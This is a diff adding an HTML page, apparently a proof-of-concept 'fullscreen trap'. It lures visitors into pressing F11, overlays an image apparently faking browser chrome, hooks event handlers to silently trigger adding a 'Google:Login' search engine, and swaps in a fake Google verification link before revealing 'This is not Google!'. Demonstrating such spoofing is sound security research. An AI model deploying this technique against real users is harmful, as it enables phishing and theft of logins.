@@ -1,0 +1,69 @@
+<html>
+
+<head>
+    <title>Fullscreen Trap 2</title>
+</head>
+
+<body>
+    <img id=q src='http://i.imgur.com/FpVN3Eq.png' />
+    <br>
+    <h3 id="qGoog">This is not Google!</h3>
+    <br>
+    <b id="qtext">Press F11 to prove youre human</b>
+    <style>
+        #qGoog {
+            margin-top: 200px;
+            display: none;
+        }
+
+        #q {
+
+            border: 0;
+            position: absolute;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+        }
+    </style>
+    <br>
+    <div id="qxy"></div>
+    <script>
+        q.style.top = '-170px';
+        var thing = true;
+        for (a in q) {
+            if (a.indexOf('on') == 0 && a.indexOf('load') < 0) {
+                q[a] = function (e) {
+                    if (e.clientY < 60 && thing) {
+                        thing = false;
+                        try {
+                            window.sidebar.addSearchEngine('Google:Login', 1, 1, 1);
+                            setTimeout('window.thing=true', 1000);
+                        } catch (e) { console.dir(e) };
+                    }
+                }
+            }
+        }
+
+        this['onresize'] = function (e) {
+
+            qtext.remove();
+
+            var elem = document.createElement('a');
+
+            elem.href = 'https://www.google.com/loginVerify';
+            elem.innerHTML = 'Click here to go to Google verification page';
+            elem.onclick = function (e) {
+                for (r in window) {
+                    if (r.indexOf('on') == 0) { window[r] = function (e) { return false; } }
+                }
+                this.remove(); window.q.style.top = '0px'; qGoog.style.display = 'block'; return false;
+            };
+
+            document.body.appendChild(elem);
+        }
+    </script>
+
+</body>
+</html>
